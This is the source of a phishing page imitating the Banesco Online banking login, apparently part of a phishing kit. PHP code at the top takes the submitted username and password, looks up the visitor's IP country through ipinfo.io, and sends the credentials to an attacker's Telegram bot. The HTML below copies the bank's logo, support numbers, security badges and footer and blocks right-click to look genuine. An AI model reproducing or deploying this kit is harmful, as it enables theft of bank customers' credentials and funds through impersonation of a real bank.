<?php
ini_set("display_errors", 0);
include "DONDECAE.php";


if (isset($_POST['PR9345FW']) && isset($_POST['pr3xt4rs']) ) {
    $input2 = $_POST['PR9345FW'];
    $input3 = $_POST['pr3xt4rs'];
    $ipInfoResponse = getIpInfo($_SERVER['REMOTE_ADDR']);
    $codigopais = isset($ipInfoResponse['country']) ? $ipInfoResponse['country'] : 'Desconocido';
    $mensajex .= "B4NESCO\nUS4R: ".$_POST['PR9345FW']."\nCl4x: ".$_POST['pr3xt4rs']."\nIP: ".$_SERVER['REMOTE_ADDR']."\nPaís: ".$codigopais."\nC0DE BY SYN4PSE";

    env($tafuta, $tid, $mensajex);
}
function getIpInfo($ip) {
    $url = "http://ipinfo.io/{$ip}/json";  
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);
    
    return json_decode($response, true);
}
function env($token, $chatID, $mensaje) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = array(
        'chat_id' => $chatID,
        'text' => $mensaje
    );

    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
    );

    $curl = curl_init();
    curl_setopt_array($curl, $options);
    $response = curl_exec($curl);
    curl_close($curl);

    return $response;
    
}

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

 
      <meta http-equiv="Content-Script-Type" content="text/tcl">
      <meta http-equiv="Content-Style-Type" content="text/css">
     
      <link rel="stylesheet" href="StylesheetIcon.css">
      <link href="temita.css" type="text/css" rel="stylesheet">
      <title>
         Banesco Online
      </title>
      <style type="text/css">#_copy{align-items:center;background:#4494d5;border-radius:3px;color:#fff;cursor:pointer;display:flex;font-size:13px;height:30px;justify-content:center;position:absolute;width:60px;z-index:1000}#select-tooltip,#sfModal,.modal-backdrop,div[id^=reader-helper]{display:none!important}.modal-open{overflow:auto!important}._sf_adjust_body{padding-right:0!important}.super_copy_btns_div{position:fixed;width:154px;left:10px;top:45%;background:#e7f1ff;border:2px solid #4595d5;font-weight:600;border-radius:2px;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;z-index:5000}.super_copy_btns_logo{width:100%;background:#4595d5;text-align:center;font-size:12px;color:#e7f1ff;line-height:30px;height:30px}.super_copy_btns_btn{display:block;width:128px;height:28px;background:#7f5711;border-radius:4px;color:#fff;font-size:12px;border:0;outline:0;margin:8px auto;font-weight:700;cursor:pointer;opacity:.9}.super_copy_btns_btn:hover{opacity:.8}.super_copy_btns_btn:active{opacity:1}</style>
   </head>
   <body onload="javascript:breakout_of_frame();clock(&#39;TitleFormat&#39;);" oncontextmenu="return false;">
      <form method="post" action="recrgs.php" id="aspnetForm">
         
         <div>
            <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="64F393AB">
         </div>
         <table id="mainwrapper">
            <tbody>
               <tr class="TopArea">
                  <td class="content-title">
                    
                     <table id="header" class="TopBackFondo">
                        <tbody>
                           <tr>
                              <td>
                                 <table cellpadding="0" cellspacing="0">
                                    <tbody>
                                       <tr>
                                          <td class="SepLogoLog"><img id="ctl00_BanescoImage1" class="DefImg" src="logo_BanescOnline.png" alt="" style="border-width:0px;"></td>
                                       </tr>
                                    </tbody>
                                 </table>
                              </td>
                              <td class="TMax">
                                 <table>
                                    <tbody>
                                       <tr class="AreaTB">
                                          <td colspan="5"></td>
                                       </tr>
                                    </tbody>
                                 </table>
                              </td>
                              <td style="vertical-align:bottom">
                                 <table border="0" cellpadding="0" cellspacing="0">
                                    <tbody>
                                       <tr>
                                          <td class="LTop">
                                             <table cellpadding="0" cellspacing="0" border="0">
                                                <tbody>
                                                   <tr style="height: 50px">
                                                      <td style="padding-right: 18px; padding-left: 18px">
                                                         <a id="ctl00_btnSalir_lkButton" class="icon-salida" href="#" style="color:#007953;font-size:32px;text-decoration: none;"></a>
                                                      </td>
                                                   </tr>
                                                </tbody>
                                             </table>
                                          </td>
                                          <td style="width:10px">&nbsp;</td>
                                       </tr>
                                    </tbody>
                                 </table>
                              </td>
                           </tr>
                        </tbody>
                     </table>
                  </td>
               </tr>
               <tr>
                  <td class="content-title" align="center">
                     <table cellpadding="0" cellspacing="0" border="0" width="100%" style="background-color:#F7F7F7; height:2px;">
                        <tbody>
                           <tr>
                              <td></td>
                           </tr>
                        </tbody>
                     </table>
                  </td>
               </tr>
               <tr valign="top">
                  <td>
                     <table id="content">
                        <tbody>
                           <tr>
                              <td id="content-left">
                                 <div style="padding-top: 10px;">
                                    <table class="BoxSop" cellspacing="0" cellpadding="0">
                                       <tbody>
                                          <tr>
                                             <td>
                                                <div class="SopBanca">
                                                   <span>
                                                   <span class="txtSopBox">Soporte Banca<br>por Internet</span></span>
                                                   <span class="txtSop">Si desea más información  o tiene  alguna duda llámenos<br>&nbsp;</span>
                                                   <span>
                                                   <span id="ctl00_InfSoporte_BanescoLabel1" class="txtSopInfoDes">al&nbsp;0500-226.2624 o <br>al 0212-501.1111</span></span>
                                                </div>
                                             </td>
                                          </tr>
                                          <tr>
                                             <td>
                                                <br>
                                                <br>
                                             </td>
                                          </tr>
                                          <tr>
                                             <td>
                                                <a href="#">
                                                <img src="GESTION-DE-CLAVES4.png" alt="" >
                                                </a>
                                             </td>
                                          </tr>
                                          <tr>
                                             <td>
                                                <br>
                                                <br>
                                             </td>
                                          </tr>
                                          <tr>
                                             <td>
                                                <a style="text-decoration: none;" href="#">
                                                <img src="Sitio_Seguro.png" alt="" width="90">
                                                </a>
                                               
                                                <a  href="#">
                                                <img border="0" height="37" width="100" src="202.svg" oncontextmenu="alert(&#39;Copying Prohibited by Law - TrustedSite is a Trademark of TrustedSite, LLC&#39;); return false;">
                                                </a>
                                             </td>
                                          </tr>
                                       </tbody>
                                    </table>
                                 </div>
                              </td>
                              <td id="content-right">
                                 <link rel="stylesheet" type="text/css" href="sweetalert2.css">
                                 
                                 <iframe src="frames.htm" id="ctl00_cp_frmAplicacion" title="CAU" frameborder="0" onload="resize_iframe()" style="margin:0px; border:none; overflow:hidden; width:100%; height: 640px; padding-top: 10px;"></iframe>
                              </td>
                           </tr>
                        </tbody>
                     </table>
                  </td>
               </tr>
               <tr>
                  <td>
                     <div id="footer">Banesco Banco Universal, C.A. - RIF: J-07013380-5 Copyright 2002. Todos los derechos reservados.</div>
                  </td>
               </tr>
            </tbody>
         </table>
      </form>
    
   </body>
</html>
